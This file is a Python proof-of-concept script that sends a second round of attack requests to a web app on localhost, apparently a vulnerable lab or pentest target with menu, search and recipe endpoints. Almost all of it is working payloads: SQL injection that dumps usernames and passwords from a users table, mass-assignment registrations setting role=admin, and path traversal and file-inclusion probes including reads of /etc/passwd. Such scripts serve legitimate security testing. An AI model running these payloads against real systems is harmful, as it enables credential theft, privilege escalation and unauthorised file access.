import urllib.request
import urllib.parse
import json
import sys
import io

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
BASE = "http://localhost:4443"
WARN = "[!]"
OK = "[+]"
MISS = "[-]"

def curl(method, path, headers=None, data=None, content_type=None):
    """Like curl: handles URL encoding, doesn't choke on spaces."""
    headers = headers or {}
    url = BASE + path
    body = None
    if data is not None:
        if isinstance(data, dict):
            if content_type and "json" in content_type:
                body = json.dumps(data).encode()
                headers.setdefault("Content-Type", "application/json")
            else:
                body = urllib.parse.urlencode(data).encode()
                headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif isinstance(data, str):
            body = data.encode()
            if content_type:
                headers["Content-Type"] = content_type
        else:
            body = data
    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return None, str(e)

def show(label, status, body, ok_check=None, max_len=300):
    flag = MISS
    if ok_check and ok_check(body):
        flag = OK
    print(f"  {flag} {label}")
    print(f"     HTTP {status}: {body[:max_len]}")
    print()

print("="*70)
print("LIVE PoCs ROUND 2 -- corrected payloads")
print("="*70)

# C1 SQLi - try with proper URL encoding
print("\n--- C1: /api/menu/{id} SQLi ---")
for p in [
    "/api/menu/0%20UNION%20SELECT%201,username,email,password,role,image_url,1%20FROM%20users--",
    "/api/menu/0%20UNION%20SELECT%20username,email,password,role%20FROM%20users--",
    "/api/menu/0+UNION+SELECT+1,username,email,password,role,image_url,1+FROM+users--",
    "/api/menu/1;SELECT%20*%20FROM%20users--",
]:
    s, b = curl("GET", p)
    show(p, s, b, lambda x: "password" in x and "admin" in x)

# Try POST
for p in [
    "/api/menu/0",
]:
    s, b = curl("GET", p)
    show(f"baseline {p}", s, b, lambda x: "name" in x)

# C2 SQLi - search
print("\n--- C2: /api/search SQLi ---")
for q in [
    "' OR '1'='1",
    "' UNION SELECT username,email,password,role FROM users--",
    "'; SELECT * FROM users--",
    "%' OR 1=1--",
    "x' UNION SELECT 1,2,3,4,5,6,7 FROM users--",
]:
    p = "/api/search?q=" + urllib.parse.quote(q)
    s, b = curl("GET", p)
    show(f"q={q!r}", s, b, lambda x: "admin" in x and "password" in x)

# C5 mass assignment - try various bodies
print("\n--- C5: Mass Assignment to /register ---")
endpoints = [
    ("/register", "POST", {"username": "h2", "email": "h2@h.com", "password": "Hax123", "role": "admin"}),
    ("/register", "POST", {"username": "h3", "email": "h3@h.com", "password": "Hax123", "role": "admin"}, "application/json"),
    ("/api/register", "POST", {"username": "h4", "email": "h4@h.com", "password": "Hax123", "role": "admin"}),
    ("/api/auth/register", "POST", {"username": "h5", "email": "h5@h.com", "password": "Hax123", "role": "admin"}),
    ("/api/user/register", "POST", {"username": "h6", "email": "h6@h.com", "password": "Hax123", "role": "admin"}),
    ("/api/profile/update", "POST", {"role": "admin"}),
    ("/api/user/update", "POST", {"role": "admin"}),
]
for ep in endpoints:
    if len(ep) == 3:
        path, method, data = ep
        ct = None
    else:
        path, method, data, ct = ep
    s, b = curl(method, path, data=data, content_type=ct)
    show(f"{method} {path} (role=admin)", s, b, lambda x: "admin" in x.lower() and "error" not in x.lower())

# H7 path traversal - find correct path
print("\n--- H7: Path traversal ---")
for p in [
    "/api/files?name=../../go.mod",
    "/api/files?name=..%2F..%2Fgo.mod",
    "/api/files?name=....//go.mod",
    "/api/files?name=../../../../etc/passwd",
    "/api/files?name=../../main.go",
    "/api/files?name=static/../go.mod",
    "/api/files?name=static/../../go.mod",
    "/api/files/..%2F..%2Fgo.mod",
    "/api/download?name=../../go.mod",
    "/api/static?name=../../go.mod",
    "/files?name=../../go.mod",
    "/api/../go.mod",
    "/api/files/static/uploads/../../go.mod",
]:
    s, b = curl("GET", p)
    show(p, s, b, lambda x: "package " in x or "module" in x)

# C6 LFI - find correct recipe endpoint
print("\n--- C6: LFI / RFI in recipe ---")
for p in [
    "/api/recipe?source=../../go.mod",
    "/api/recipe?file=../../go.mod",
    "/api/recipe?name=../../go.mod",
    "/api/recipes?source=../../go.mod",
    "/api/recipes/..%2F..%2Fgo.mod",
    "/api/recipes/pasta?source=../../go.mod",
    "/api/recipe/load?source=../../go.mod",
    "/api/recipe/view?source=../../go.mod",
    "/api/recipe/fetch?source=../../go.mod",
    "/recipe?source=../../go.mod",
    "/api/kitchen/recipe?source=../../go.mod",
    "/api/kitchen/recipe/load?source=../../go.mod",
    "/api/advanced/recipe?source=../../go.mod",
    "/api/lab/recipe?source=../../go.mod",
    "/lab/recipe?source=../../go.mod",
]:
    s, b = curl("GET", p)
    show(p, s, b, lambda x: "package " in x or "Margherita" in x or "pasta" in x.lower() or "salmon" in x.lower())

# Check existing routes
print("\n--- Discover routes ---")
import urllib.request
for p in ["/api/", "/api", "/admin", "/", "/api/menu", "/api/orders", "/api/debug", "/api/staff", "/api/kitchen"]:
    s, b = curl("GET", p)
    if s and s != 404:
        print(f"  {p} -> HTTP {s}: {b[:100]}")
